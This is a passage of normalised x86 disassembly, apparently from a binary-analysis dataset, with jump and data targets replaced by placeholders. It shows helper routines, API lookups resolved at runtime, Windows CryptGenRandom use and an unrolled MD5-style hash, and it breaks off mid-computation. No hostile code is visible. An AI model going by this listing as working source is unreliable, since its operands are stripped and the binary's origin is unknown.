call sub_1000d4d4
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x10 ]
push 0x0
push [ ebp - 0x4 ]
call edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp - 0x4 ]
call edi
mov eax esi
push esi
push 0x0
jmp r-xdata
add ebx 0x8
cmp ebx [ esi + 0x94 ]
jb r-xdata
push [ ebp - 0x4 ]
call edi
xor esi esi
jmp r-xdata
sub_1000d0c6
cmp [ esp + 0xc ] 0x0
push esi
je r-xdata
xor eax eax
pop esi
retn
mov esi [ esp + 0x8 ]
mov eax [ esp + 0xc ]
movzx ecx [ eax - 0x1 ]
movzx eax [ esi - 0x1 ]
sub eax ecx
pop esi
retn
dec [ esp + 0x10 ]
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
inc eax
inc esi
cmp cl dl
jne r-xdata
sub_1000d0f6
mov ecx [ esp + 0x8 ]
cmp ecx 0x5
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
je r-xdata
add eax 0x4
push eax
call sub_1000d96b
pop ecx
xor eax eax
retn
mov eax 0x402
retn
sub_1000d118
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x5
je r-xdata
push [ esp + 0xc ]
add eax 0x4
push [ esp + 0xc ]
push eax
call sub_1000e22a
add esp 0xc
xor eax eax
retn
mov eax 0x402
retn
sub_1000d13e
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
xor ecx ecx
cmp [ eax ] 0x5
sete cl
mov [ edx ] ecx
cmp [ eax ] 0x5
je r-xdata
add eax 0x4
push eax
push [ esp + 0xc ]
call sub_1000e2c5
pop ecx
pop ecx
xor eax eax
retn
mov eax 0x402
retn
sub_1000d177
push esi
mov esi eax
mov al [ esp + 0x8 ]
push 0x4
mov [ esi + 0xd ] al
lea eax [ esi + 0xe ]
push rw-data
push eax
call sub_1000d0aa
push 0xd
push rw-data
push esi
call sub_1000d0aa
push 0x10
push [ esp + 0x28 ]
add esi 0x12
push esi
call sub_1000d0aa
add esp 0x24
pop esi
retn
sub_1000d1b2
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0x18 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x14 ]
add eax 0x4
push [ ebp + 0x10 ]
push eax
call sub_1000ef87
add esp 0x10
xor eax eax
pop ebp
retn
mov eax 0x40d
pop ebp
retn
sub_1000d1fc
push ebp
lea ebp [ esp - 0x68 ]
sub esp 0xc0
push ebx
push edi
mov edi 0x80
cmp [ ebp + 0x78 ] edi
jbe r-xdata
push esi
mov esi [ ebp + 0x70 ]
lea eax [ ebp + 0x60 ]
push eax
lea eax [ ebp + 0x4c ]
push eax
push esi
call sub_1000d13e
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
mov ebx 0x406
jmp r-xdata
push 0x14
lea eax [ ebp + 0x4c ]
push 0x0
push eax
call sub_1000d091
push 0x22
lea eax [ ebp + 0x28 ]
push 0x0
push eax
call sub_1000d091
push edi
lea eax [ ebp - 0x58 ]
push 0x0
push eax
call sub_1000d091
add esp 0x24
pop esi
lea eax [ ebp + 0x4c ]
push eax
push [ esi ]
lea eax [ ebp + 0x28 ]
call sub_1000d177
push [ ebp + 0x7c ]
lea eax [ ebp + 0x64 ]
push [ ebp + 0x78 ]
push [ ebp + 0x74 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_1000f4f6
add esp 0x1c
test eax eax
je r-xdata
pop edi
mov eax ebx
pop ebx
add ebp 0x68
leave
retn
cmp [ ebp + 0x64 ] 0x22
jne r-xdata
mov ebx 0x40a
jmp r-xdata
mov ebx 0x40b
mov al [ ebp - 0x4b ]
cmp al [ ebp + 0x35 ]
jne r-xdata
push 0x22
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_1000d0c6
add esp 0xc
test eax eax
jne r-xdata
push [ esi ]
push esi
call sub_1000d0f6
pop ecx
pop ecx
jmp r-xdata
sub_1000d2d2
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x24 ]
mov edi [ ebp + 0x20 ]
lea eax [ ebp - 0x1c ]
push 0x18
push eax
mov [ esi ] edi
call sub_1000d86b
add esp 0xc
test eax eax
mov [ ebp + 0x20 ] eax
jne r-xdata
push 0x18
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call sub_1000d091
mov eax [ ebp + 0x20 ]
add esp 0xc
pop edi
pop esi
leave
retn
push [ ebp + 0x24 ]
push 0x8
push [ ebp + 0x14 ]
call sub_1000d86b
add esp 0xc
test eax eax
mov [ ebp + 0x20 ] eax
jne r-xdata
push 0x1
push [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
push edi
push esi
call sub_1000d1b2
add esp 0x14
test eax eax
mov [ ebp + 0x20 ] eax
jne r-xdata
and [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] eax
push ebx
jbe r-xdata
and [ esi + 0x1a0 ] 0x0
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x1c ]
mov ebx [ ebp + 0xc ]
sub edi esi
sub ebx esi
mov [ ebp + 0x20 ] 0x40a
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add esi 0x4
cmp eax [ ebp + 0x18 ]
jb r-xdata
pop ebx
push [ ebp + 0x24 ]
lea eax [ ebp - 0x1c ]
push [ edi + esi ]
push 0x18
push eax
push esi
push [ ebx + esi ]
call sub_1000f41a
add esp 0x18
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
sub_1000d396
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x18 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x1a0 ]
push 0x8
pop esi
sub esi eax
cmp ebx esi
jae r-xdata
push esi
push [ ebp + 0x14 ]
lea eax [ eax + edi + 0x198 ]
push eax
call sub_1000d0aa
lea eax [ edi + 0x198 ]
push 0x8
push eax
push [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
mov eax edi
call sub_1000d1de
add [ ebp + 0x14 ] esi
sub [ ebp + 0x18 ] esi
mov esi [ ebp + 0x18 ]
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
shr esi 0x3
shl esi 0x3
push esi
push [ ebp + 0x14 ]
add eax 0x8
push eax
mov eax edi
mov [ ebx ] 0x8
call sub_1000d1de
mov eax [ ebp + 0x18 ]
add [ ebx ] esi
sub eax esi
push eax
mov [ edi + 0x1a0 ] eax
mov eax [ ebp + 0x14 ]
add esi eax
push esi
push [ ebp + 0x8 ]
call sub_1000d0aa
add esp 0x30
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
mov eax [ edi + 0x1a0 ]
push ebx
push [ ebp + 0x14 ]
lea eax [ edi + eax + 0x198 ]
push eax
call sub_1000d0aa
add esp 0xc
add [ edi + 0x1a0 ] ebx
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
sub_1000d450
push ebp
mov ebp esp
sub esp 0x80
push ebx
mov ebx 0x80
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x14 ]
lea eax [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ esi ] edi
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_1000f5a6
add esp 0x14
test eax eax
je r-xdata
mov eax 0x406
jmp r-xdata
cmp [ ebp + 0x14 ] 0x18
jne r-xdata
mov edi 0x409
jmp r-xdata
pop ebx
leave
retn
push 0x0
push [ ebp + 0x18 ]
lea eax [ ebp - 0x80 ]
push eax
push edi
push esi
call sub_1000d1b2
mov edi eax
add esp 0x14
test edi edi
jne r-xdata
push ebx
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_1000d091
add esp 0xc
mov eax edi
pop edi
pop esi
and [ esi + 0x1a0 ] eax
sub_1000d4d4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x18 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x1a0 ]
push 0x8
pop esi
sub esi eax
cmp ebx esi
ja r-xdata
push esi
push [ ebp + 0x14 ]
lea eax [ eax + edi + 0x198 ]
push eax
call sub_1000d0aa
lea eax [ edi + 0x198 ]
push 0x8
push eax
push [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
mov eax edi
call sub_1000d1de
add [ ebp + 0x14 ] esi
mov eax [ ebp + 0x10 ]
sub ebx esi
lea esi [ ebx - 0x1 ]
shr esi 0x3
mov [ eax ] 0x8
mov eax [ ebp + 0xc ]
shl esi 0x3
push esi
push [ ebp + 0x14 ]
add eax 0x8
push eax
mov eax edi
call sub_1000d1de
mov eax [ ebp + 0x10 ]
add [ eax ] esi
mov eax [ ebp + 0x14 ]
sub ebx esi
push ebx
add esi eax
push esi
push [ ebp + 0x8 ]
mov [ edi + 0x1a0 ] ebx
call sub_1000d0aa
add esp 0x30
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
mov eax [ edi + 0x1a0 ]
push ebx
push [ ebp + 0x14 ]
lea eax [ edi + eax + 0x198 ]
push eax
call sub_1000d0aa
add esp 0xc
add [ edi + 0x1a0 ] ebx
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
sub_1000d58d
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x1a0 ]
test eax eax
jne r-xdata
cmp eax 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
jmp r-xdata
push edi
push 0x8
lea eax [ esi + 0x198 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax esi
call sub_1000d1de
movzx edi [ ebp - 0x5 ]
add esp 0xc
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x404
jmp r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_1000d091
mov eax [ ebp - 0x4 ]
add esp 0xc
pop esi
leave
retn
mov [ ebp - 0x4 ] 0x404
jmp r-xdata
cmp edi 0x8
ja r-xdata
pop edi
push edi
push [ edi * 4 + rw-data ]
lea eax [ ebp - 0x4 ]
sub eax edi
push eax
call sub_1000d0c6
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
push 0x8
pop eax
sub eax edi
push eax
mov [ ecx ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0xc ]
call sub_1000d0aa
add esp 0xc
cmp [ esi ] 0x3
jne r-xdata
and [ esi + 0x1a0 ] 0x0
lea eax [ esi + 0x4 ]
push eax
call sub_1000e329
pop ecx
sub_1000d64d
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
and [ eax ] 0x0
push esi
push r--data
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn 0xc
push edi
push r--data
push esi
call [ GetProcAddress@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov esi 0x40000001
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
call [ GetProcessHeap@IAT ]
push [ ebp - 0x4 ]
push 0x8
push eax
call [ HeapAlloc@IAT ]
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub_1000d6e4
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push r--data
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
mov [ eax ] esi
call [ LoadLibraryA@IAT ]
mov ebx eax
cmp ebx esi
jne r-xdata
push edi
push r--data
push ebx
call [ GetProcAddress@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
push ebx
call [ FreeLibrary@IAT ]
xor eax eax
jmp r-xdata
pop esi
pop ebx
leave
retn 0xc
mov ebx [ ebp - 0x8 ]
call [ GetProcessHeap@IAT ]
push [ ebp - 0x4 ]
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
pop edi
mov eax ebx
push esi
push esi
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
jmp r-xdata
sub_1000d783
push esi
mov esi [ esp + 0x8 ]
push 0x10
lea eax [ esi + 0x4 ]
push 0x0
push eax
call sub_1000d091
and [ esi + 0x14 ] 0x0
add esp 0xc
mov [ esi ] 0x100
xor eax eax
pop esi
retn
sub_1000d7a6
push ebp
mov ebp esp
sub esp 0x1c
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0xf0000000
push 0x1
xor esi esi
push esi
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ CryptAcquireContextA@IAT ]
cmp [ ebp - 0x8 ] esi
je r-xdata
xor eax eax
pop esi
leave
retn
push ebx
push edi
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push 0x4
push [ ebp - 0x8 ]
call [ CryptGenRandom@IAT ]
mov eax [ ebp - 0x4 ]
push 0x7f
cdq
pop ecx
idiv ecx
cmp edx esi
mov [ ebp - 0x4 ] edx
jl r-xdata
mov [ ebp + edi - 0x1c ] dl
inc edi
cmp edi 0x10
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
push esi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov [ ebp - 0xc ] esi
mov esi [ ebp + 0x8 ]
push 0x10
lea eax [ esi + 0x13 ]
lea ecx [ ebp - 0xd ]
pop edi
movzx dx [ eax ]
movzx bx [ ecx ]
add edx [ ebp - 0xc ]
add edx ebx
mov [ eax ] dl
movzx dx dh
dec ecx
dec eax
dec edi
mov [ ebp - 0xc ] edx
jne r-xdata
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
pop edi
pop ebx
jae r-xdata
sub eax [ ebp + 0x10 ]
mov [ esi ] eax
and [ esi ] 0x0
jmp r-xdata
push 0x10
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call sub_1000d091
add esp 0xc
sub_1000d86b
push ebp
mov ebp esp
sub esp 0x58
push edi
mov edi [ ebp + 0x10 ]
cmp [ edi ] 0x0
je r-xdata
push esi
mov esi [ edi + 0x14 ]
cmp esi [ ebp + 0xc ]
jae r-xdata
mov eax 0x408
jmp r-xdata
push [ ebp + 0xc ]
mov eax edi
sub eax esi
add eax 0x28
push eax
push [ ebp + 0x8 ]
call sub_1000d0aa
sub esi [ ebp + 0xc ]
add esp 0xc
mov [ edi + 0x14 ] esi
xor eax eax
pop esi
mov [ ebp + 0x10 ] 0xfffffffd
sub [ ebp + 0x10 ] edi
push ebx
lea ebx [ edi + 0x4 ]
pop edi
leave
retn
cmp [ ebp + 0xc ] 0x10
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec eax
add ecx eax
jne r-xdata
mov eax edi
sub eax esi
push esi
add eax 0x28
push eax
push [ ebp + 0x8 ]
call sub_1000d0aa
sub [ ebp + 0xc ] esi
add [ ebp + 0x8 ] esi
lea eax [ ebp - 0x58 ]
push eax
call sub_1000d96b
push 0x10
pop esi
push esi
lea eax [ ebp - 0x58 ]
push ebx
push eax
call sub_1000e22a
lea eax [ ebp - 0x58 ]
push eax
lea eax [ edi + 0x18 ]
push eax
call sub_1000e2c5
add esp 0x24
lea eax [ edi + 0x13 ]
pop ebx
mov cl [ eax ]
mov dl cl
inc dl
test cl cl
mov [ eax ] dl
jne r-xdata
sub_1000d92a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_1000d783
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_1000d85c
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x1
push rw-data
push esi
call sub_1000d7a6
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_1000d85c
add esp 0x14
pop esi
pop ebp
retn 0x4
sub_1000d993
test edx edx
jbe r-xdata
retn
push esi
lea esi [ edx - 0x1 ]
shr esi 0x2
inc ecx
add eax 0x2
inc esi
mov dl [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
dec esi
jne r-xdata
pop esi
sub_1000d9c4
push ebp
mov ebp esp
sub esp 0x48
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x10
add ecx 0x2
lea esi [ ebp - 0x48 ]
pop edi
movzx ebx [ ecx - 0x1 ]
xor edx edx
mov dh [ ecx + 0x1 ]
mov dl [ ecx ]
add ecx 0x4
shl edx 0x8
or edx ebx
movzx ebx [ ecx - 0x6 ]
shl edx 0x8
or edx ebx
mov [ esi ] edx
add esi 0x4
dec edi
jne r-xdata
mov esi [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ eax ]
mov ebx edi
and ebx esi
mov ecx esi
not ecx
and ecx edx
or ecx ebx
add ecx [ ebp - 0x48 ]
mov ebx esi
lea ecx [ eax + ecx - 0x28955b88 ]
mov eax ecx
shr eax 0x19
shl ecx 0x7
or eax ecx
add eax esi
and ebx eax
mov ecx eax
not ecx
and ecx edi
or ecx ebx
add ecx [ ebp - 0x44 ]
lea edx [ edx + ecx - 0x173848aa ]
mov ecx edx
shl edx 0xc
shr ecx 0x14
or ecx edx
add ecx eax
mov edx ecx
not edx
and edx esi
mov ebx ecx
and ebx eax
or edx ebx
add edx [ ebp - 0x40 ]
mov ebx ecx
lea edi [ edi + edx + 0x242070db ]
mov edx edi
shl edi 0x11
shr edx 0xf
or edx edi
add edx ecx
mov edi edx
not edi
and edi eax
and ebx edx
or edi ebx
add edi [ ebp - 0x3c ]
lea esi [ esi + edi - 0x3e423112 ]
mov edi esi
shl edi 0x16
shr esi 0xa
or edi esi
add edi edx
mov [ ebp - 0x4 ] edi
not edi
and edi ecx
mov esi edx
and esi [ ebp - 0x4 ]
or edi esi
add edi [ ebp - 0x38 ]
lea eax [ eax + edi - 0xa83f051 ]
mov edi [ ebp - 0x4 ]
mov esi eax
shl eax 0x7
shr esi 0x19
or esi eax
add esi edi
mov eax esi
not eax
and eax edx
mov ebx edi
and ebx esi
or eax ebx
add eax [ ebp - 0x34 ]
lea ecx [ ecx + eax + 0x4787c62a ]
mov eax ecx
shr eax 0x14
shl ecx 0xc
or eax ecx
add eax esi
mov ecx eax
not ecx
and ecx edi
mov ebx eax
and ebx esi
or ecx ebx
add ecx [ ebp - 0x30 ]
mov ebx eax
lea edx [ edx + ecx - 0x57cfb9ed ]
mov ecx edx
shl edx 0x11
shr ecx 0xf
or ecx edx
add ecx eax
and ebx ecx
mov edx ecx
not edx
and edx esi
or edx ebx
add edx [ ebp - 0x2c ]
lea edx [ edi + edx - 0x2b96aff ]
mov edi edx
shl edi 0x16
shr edx 0xa
or edi edx
add edi ecx
mov [ ebp - 0x4 ] edi
mov edx ecx
and edx [ ebp - 0x4 ]
not edi
and edi eax
or edi edx
add edi [ ebp - 0x28 ]
lea esi [ esi + edi + 0x698098d8 ]
mov edi [ ebp - 0x4 ]
mov edx esi
shl esi 0x7
shr edx 0x19
or edx esi
add edx edi
mov ebx edi
and ebx edx
mov esi edx
not esi
and esi ecx
or esi ebx
add esi [ ebp - 0x24 ]
lea eax [ eax + esi - 0x74bb0851 ]
mov esi eax
shl eax 0xc
shr esi 0x14
or esi eax
add esi edx
mov eax esi
not eax
and eax edi
mov ebx esi
and ebx edx
or eax ebx
add eax [ ebp - 0x20 ]
mov ebx esi
lea ecx [ ecx + eax - 0xa44f ]
mov eax ecx
shl ecx 0x11
shr eax 0xf
or eax ecx
add eax esi
mov ecx eax
not ecx
and ecx edx
and ebx eax
or ecx ebx
add ecx [ ebp - 0x1c ]
lea ecx [ edi + ecx - 0x76a32842 ]
mov edi ecx
shl edi 0x16
shr ecx 0xa
or edi ecx
add edi eax
mov [ ebp - 0x4 ] edi
not edi
and edi esi
mov ecx eax
and ecx [ ebp - 0x4 ]
or edi ecx
add edi [ ebp - 0x18 ]
lea edx [ edx + edi + 0x6b901122 ]
mov edi [ ebp - 0x4 ]
mov ecx edx
shl edx 0x7
shr ecx 0x19
or ecx edx
add ecx [ ebp - 0x4 ]
and edi ecx
mov edx ecx
not edx
and edx eax
or edx edi
add edx [ ebp - 0x14 ]
lea esi [ esi + edx - 0x2678e6d ]
mov edx esi
shl esi 0xc
shr edx 0x14
or edx esi
add edx ecx
mov edi edx
not edi
mov esi edi
and esi [ ebp - 0x4 ]
mov ebx edx
and ebx ecx
or esi ebx
add esi [ ebp - 0x10 ]
mov ebx edx
lea eax [ eax + esi - 0x5986bc72 ]
mov esi eax
shl eax 0x11
shr esi 0xf
or esi eax
add esi edx
and ebx esi
mov [ ebp - 0x8 ] esi
not [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
and eax ecx
or eax ebx
add eax [ ebp - 0xc ]
mov ebx [ ebp - 0x4 ]
lea ebx [ ebx + eax + 0x49b40821 ]
mov eax ebx
shr ebx 0xa
shl eax 0x16
or eax ebx
mov ebx edx
add eax esi
and edi esi
and ebx eax
or edi ebx
add edi [ ebp - 0x44 ]
mov ebx esi
lea ecx [ ecx + edi - 0x9e1da9e ]
mov edi ecx
shl ecx 0x5
shr edi 0x1b
or edi ecx
mov ecx [ ebp - 0x8 ]
and ecx eax
add edi eax
and ebx edi
or ecx ebx
add ecx [ ebp - 0x30 ]
lea edx [ edx + ecx - 0x3fbf4cc0 ]
mov ecx edx
shl edx 0x9
shr ecx 0x17
or ecx edx
mov edx eax
not edx
add ecx edi
and edx edi
mov ebx ecx
and ebx eax
or edx ebx
add edx [ ebp - 0x1c ]
lea esi [ esi + edx + 0x265e5a51 ]
mov edx esi
shl esi 0xe
shr edx 0x12
or edx esi
add edx ecx
mov esi edi
not esi
and esi ecx
mov ebx edx
and ebx edi
or esi ebx
add esi [ ebp - 0x48 ]
mov ebx ecx
lea eax [ eax + esi - 0x16493856 ]
mov esi eax
shr eax 0xc
shl esi 0x14
or esi eax
add esi edx
mov eax ecx
and ebx esi
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x34 ]
mov ebx edx
lea edi [ edi + eax - 0x29d0efa3 ]
mov eax edi
shl edi 0x5
shr eax 0x1b
or eax edi
mov edi edx
add eax esi
not edi
and edi esi
and ebx eax
or edi ebx
add edi [ ebp - 0x20 ]
lea ecx [ ecx + edi + 0x2441453 ]
mov edi ecx
shl ecx 0x9
shr edi 0x17
or edi ecx
mov ecx esi
add edi eax
not ecx
and ecx eax
mov ebx edi
and ebx esi
or ecx ebx
add ecx [ ebp - 0xc ]
lea edx [ edx + ecx - 0x275e197f ]
mov ecx edx
shl edx 0xe
shr ecx 0x12
or ecx edx
add ecx edi
mov edx eax
not edx
and edx edi
mov ebx ecx
and ebx eax
or edx ebx
add edx [ ebp - 0x38 ]
mov ebx edi
lea esi [ esi + edx - 0x182c0438 ]
mov edx esi
shr esi 0xc
shl edx 0x14
or edx esi
mov esi edi
add edx ecx
not esi
and esi ecx
and ebx edx
or esi ebx
add esi [ ebp - 0x24 ]
mov ebx ecx
lea eax [ eax + esi + 0x21e1cde6 ]
mov esi eax
shl eax 0x5
shr esi 0x1b
or esi eax
add esi edx
and ebx esi
mov eax ecx
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x10 ]
lea edi [ edi + eax - 0x3cc8f82a ]
mov eax edi
shl edi 0x9
shr eax 0x17
or eax edi
add eax esi
mov edi edx
mov ebx eax
and ebx edx
not edi
and edi esi
or edi ebx
add edi [ ebp - 0x3c ]
lea ecx [ ecx + edi - 0xb2af279 ]
mov edi ecx
shl ecx 0xe
shr edi 0x12
or edi ecx
add edi eax
mov ecx esi
not ecx
and ecx eax
mov ebx edi
and ebx esi
or ecx ebx
add ecx [ ebp - 0x28 ]
mov ebx eax
lea edx [ edx + ecx + 0x455a14ed ]
mov ecx edx
shr edx 0xc
shl ecx 0x14
or ecx edx
mov edx eax
add ecx edi
not edx
and edx edi
and ebx ecx
or edx ebx
add edx [ ebp - 0x14 ]
mov ebx edi
lea esi [ esi + edx - 0x561c16fb ]
mov edx esi
shl esi 0x5
shr edx 0x1b
or edx esi
add edx ecx
mov esi edi
not esi
and esi ecx
and ebx edx
or esi ebx
add esi [ ebp - 0x40 ]
lea eax [ eax + esi - 0x3105c08 ]
mov esi eax
shl eax 0x9
shr esi 0x17
or esi eax
add esi edx
mov eax ecx
not eax
and eax edx
mov ebx esi
and ebx ecx
or eax ebx
add eax [ ebp - 0x2c ]
lea edi [ edi + eax + 0x676f02d9 ]
mov eax edi
shl edi 0xe
shr eax 0x12
or eax edi
add eax esi
mov edi edx
not edi
and edi esi
mov ebx eax
and ebx edx
or edi ebx
add edi [ ebp - 0x18 ]
lea ecx [ ecx + edi - 0x72d5b376 ]
mov edi ecx
shr ecx 0xc
shl edi 0x14
or edi ecx
add edi eax
mov ecx esi
xor ecx eax
xor ecx edi
add ecx [ ebp - 0x34 ]
lea edx [ edx + ecx - 0x5c6be ]
mov ecx edx
shl edx 0x4
shr ecx 0x1c
or ecx edx
add ecx edi
mov edx eax
xor edx edi
xor edx ecx
add edx [ ebp - 0x28 ]
lea esi [ esi + edx - 0x788e097f ]
mov ebx esi
shl esi 0xb
shr ebx 0x15
or ebx esi
add ebx ecx
mov edx ebx
xor edx edi
xor edx ecx
add edx [ ebp - 0x1c ]
lea eax [ eax + edx + 0x6d9d6122 ]
mov esi eax
shl eax 0x10
shr esi 0x10
or esi eax
add esi ebx
mov edx ebx
xor edx esi
mov eax edx
xor eax ecx
add eax [ ebp - 0x10 ]
lea edi [ edi + eax - 0x21ac7f4 ]
mov eax edi
shr edi 0x9
shl eax 0x17
or eax edi
add eax esi
xor edx eax
add edx [ ebp - 0x44 ]
lea ecx [ ecx + edx - 0x5b4115bc ]
mov edx ecx
shl ecx 0x4
shr edx 0x1c
or edx ecx
add edx eax
mov ecx esi
xor ecx eax
xor ecx edx
add ecx [ ebp - 0x38 ]
lea ebx [ ebx + ecx + 0x4bdecfa9 ]
mov edi ebx
shr edi 0x15
shl ebx 0xb
or edi ebx
add edi edx
mov ecx edi
xor ecx eax
xor ecx edx
add ecx [ ebp - 0x2c ]
lea ecx [ esi + ecx - 0x944b4a0 ]
mov esi ecx
shl ecx 0x10
shr esi 0x10
or esi ecx
add esi edi
mov ecx edi
xor ecx esi
mov ebx ecx
xor ebx edx
add ebx [ ebp - 0x20 ]
lea ebx [ eax + ebx - 0x41404390 ]
mov eax ebx
shl eax 0x17
shr ebx 0x9
or eax ebx
add eax esi
xor ecx eax
add ecx [ ebp - 0x14 ]
lea edx [ edx + ecx + 0x289b7ec6 ]
mov ecx edx
shl edx 0x4
shr ecx 0x1c
or ecx edx
add ecx eax
mov edx esi
xor edx eax
xor edx ecx
add edx [ ebp - 0x48 ]
lea edi [ edi + edx - 0x155ed806 ]
mov edx edi
shl edi 0xb
shr edx 0x15
or edx edi
add edx ecx
mov edi edx
xor edi eax
xor edi ecx
add edi [ ebp - 0x3c ]
lea edi [ esi + edi - 0x2b10cf7b ]
mov esi edi
shl edi 0x10
shr esi 0x10
or esi edi
add esi edx
mov edi edx
xor edi esi
mov ebx edi
xor ebx ecx
add ebx [ ebp - 0x30 ]
lea ebx [ eax + ebx + 0x4881d05 ]
mov eax ebx
shl eax 0x17
shr ebx 0x9
or eax ebx
add eax esi
xor edi eax
add edi [ ebp - 0x24 ]
lea edi [ ecx + edi - 0x262b2fc7 ]
mov ecx edi
shl edi 0x4
shr ecx 0x1c
or ecx edi
mov edi esi
xor edi eax
add ecx eax
xor edi ecx
add edi [ ebp - 0x18 ]
lea edi [ edx + edi - 0x1924661b ]
mov edx edi
shl edi 0xb
shr edx 0x15
or edx edi
add edx ecx
mov edi edx
xor edi eax
xor edi ecx
add edi [ ebp - 0xc ]
lea edi [ esi + edi + 0x1fa27cf8 ]
mov esi edi
shr esi 0x10
shl edi 0x10
or esi edi
add esi edx
mov edi edx
xor edi esi
xor edi ecx
add edi [ ebp - 0x40 ]
lea eax [ eax + edi - 0x3b53a99b ]
mov edi eax
shl edi 0x17
shr eax 0x9
or edi eax
add edi esi
mov eax edx
not eax
or eax edi
xor eax esi
add eax [ ebp - 0x48 ]
lea ecx [ ecx + eax - 0xbd6ddbc ]
mov eax ecx
shl ecx 0x6
shr eax 0x1a
or eax ecx
add eax edi
mov ecx esi
not ecx
or ecx eax
xor ecx edi
add ecx [ ebp - 0x2c ]
lea edx [ edx + ecx + 0x432aff97 ]
mov ecx edx
shl edx 0xa
shr ecx 0x16
or ecx edx
mov edx edi
add ecx eax
not edx
or edx ecx
xor edx eax
